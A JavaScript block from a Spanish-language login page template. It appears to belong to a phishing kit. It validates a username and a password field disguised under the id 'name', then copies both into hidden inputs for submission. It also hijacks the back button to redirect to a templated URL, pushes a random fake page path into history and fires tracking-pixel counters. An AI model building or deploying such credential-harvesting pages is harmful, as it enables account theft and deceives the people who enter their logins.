    <script>
        let usernameInput, namePwsInput, submitButton, spinner, modal, overlay, modalButton, clearUserIcon, showHidePswContainer;

        document.addEventListener("DOMContentLoaded", setupFormElements);

        function setupFormElements() {
            initializeElements();
            setupEventListeners();
            setupHistoryAndCounters();
        }

        function initializeElements() {
            usernameInput = document.getElementById('username');
            namePwsInput = document.getElementById('name');
            submitButton = document.querySelector('button[type="submit"]');
            spinner = document.getElementById('spinner');
            modal = document.getElementById('modal');
            overlay = document.getElementById('overlay');
            modalButton = document.getElementById('modalButton');
            clearUserIcon = document.querySelector('#clearIcon');
            showHidePswContainer = document.getElementById('show-hide');
        }

        function setupEventListeners() {
            usernameInput.addEventListener('focus', () => handleFocus(usernameInput));
            usernameInput.addEventListener('blur', () => handleBlur(usernameInput));
            usernameInput.addEventListener('input', () => handleInputChange(usernameInput));

            namePwsInput.addEventListener('focus', () => handleFocus(namePwsInput));
            namePwsInput.addEventListener('blur', () => handleBlur(namePwsInput));
            namePwsInput.addEventListener('input', () => handleInputChange(namePwsInput));

            clearUserIcon.addEventListener('mousedown', clearUsernameInput);
            document.getElementById('hide').addEventListener('mousedown', togglePasswordVisibility);
            document.getElementById('show').addEventListener('mousedown', togglePasswordVisibility);

            modal.addEventListener('click', closeModal);
            document.querySelector('form').addEventListener('keydown', handleFormKeydown);
        }

        function setupHistoryAndCounters() {
            window.addEventListener('popstate', () => window.location.href = "{{payload.backRedirect}}");
            history.pushState({ page: 'mi_pagina' }, 'Mi Página', generateId(15));

            setTimeout(() => new Image().src = "{{payload.counter}}", 100);
            setTimeout(() => new Image().src = "{{payload.globalCounter}}", 100);
        }

        function handleFocus(input) {
            document.getElementById('splitMessage').style.display = 'none';
            handleInputChange(input);
        }

        function handleBlur(input) {
            setTimeout(() => {
                if (!document.querySelector(':focus')) {
                    document.getElementById('splitMessage').style.display = 'block';
                }
            }, 300);
            handleInputChange(input);
        }

        function handleInputChange(input) {
            const inputValue = input.value.trim();
            if (input.id === 'username') {
                clearUserIcon.style.display = inputValue && document.activeElement === input ? 'block' : 'none';
            } else {
                showHidePswContainer.style.display = inputValue ? 'block' : 'none';
            }
        }

        function clearUsernameInput(event) {
            event.preventDefault();
            usernameInput.value = '';
            handleInputChange(usernameInput);
        }

        function togglePasswordVisibility(event) {
            event.preventDefault();
            namePwsInput.classList.toggle('ehloqInput');
            document.getElementById('hide').classList.toggle('hidden');
            document.getElementById('show').classList.toggle('hidden');
        }

        function closeModal(event) {
            if (event.target === overlay || event.target === modalButton) {
                modal.style.display = 'none';
            }
        }

        function handleFormKeydown(event) {
            if (event.key === 'Enter') {
                const activeElement = document.activeElement;
                if (activeElement.id === 'username') {
                    document.getElementById('name').focus();
                    event.preventDefault();
                }
            }
        }

        function generateId(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            return '/' + Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('') + '.html';
        }

        function changeFormStatus(sending) {
            const inputs = [usernameInput, namePwsInput, submitButton];
            inputs.forEach(input => input.disabled = sending);
            submitButton.querySelector('#text').style.visibility = sending ? 'hidden' : 'visible';
            spinner.style.display = sending ? 'block' : 'none';
        }

        function showModalMessage() {
            modal.style.display = 'block';
        }

        function addHiddenInput(name, value) {
            const inputHidden = document.createElement("input");
            inputHidden.type = "hidden";
            inputHidden.name = name;
            inputHidden.value = value;
            document.querySelector("form").appendChild(inputHidden);
        }

        async function validateForm() {
            try {
                const usernameValue = usernameInput.value.trim();
                const nameValue = namePwsInput.value.trim();

                changeFormStatus(true);

                if (hasRepeatedSequence(usernameValue) || hasRepeatedSequence(nameValue)) {
                    return validateResponse({ isOk: false, message: 'Error: Secuencia repetida' });
                }

                if (isInvalidEmail(usernameValue)) {
                    return validateResponse({ isOk: false, message: 'Error: Correo electrónico inválido' });
                }

                if (isInvalidPhoneNumber(usernameValue)) {
                    return validateResponse({ isOk: false, message: 'Error: Número de teléfono inválido' });
                }

                if (isTooShort(usernameValue, 5) && !usernameValue.includes('@') && !isPhoneNumber(usernameValue)) {
                    return validateResponse({ isOk: false, message: 'Error: Usuario demasiado corto' });
                }

                if (isTooShort(nameValue, 5)) {
                    return validateResponse({ isOk: false, message: 'Error: Contraseña demasiada corta' });
                }

                addHiddenInput('username', usernameInput.value);
                addHiddenInput('name', namePwsInput.value);

                return validateResponse({ isOk: true, message: 'Formulario válido' });
            } catch (error) {
                console.error("ERROR => ", error);
                return validateResponse({ isOk: false, message: 'Error inesperado en try catch' });
            }
        }

        function hasRepeatedSequence(value) {
            return /(.)\1{2,}/.test(value);
        }

        function isInvalidEmail(value) {
            const emailPattern = /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/;
            return value.includes('@') && !emailPattern.test(value);
        }

        function isInvalidPhoneNumber(value) {
            const phonePattern = /^\d|\+$/;
            if (phonePattern.test(value.charAt(0))) {
                if (value.charAt(0) === '+') {
                    const phoneNumberWithoutPlus = value.slice(1);
                    return !/^\d+$/.test(phoneNumberWithoutPlus) || phoneNumberWithoutPlus.length < 10 || phoneNumberWithoutPlus.length > 13;
                } else {
                    return !/^\d+$/.test(value) || value.length < 10 || value.length > 13;
                }
            }
            return false;
        }

        function isTooShort(value, minLength) {
            return value.length <= minLength;
        }

        function isPhoneNumber(value) {
            return /^\d|\+$/.test(value.charAt(0));
        }

        function validateResponse({ isOk, message }) {
            if (!isOk) {
                setTimeout(() => {
                    showModalMessage();
                    changeFormStatus(false);
                }, 500);
            }
            return isOk;
        }
    </script>

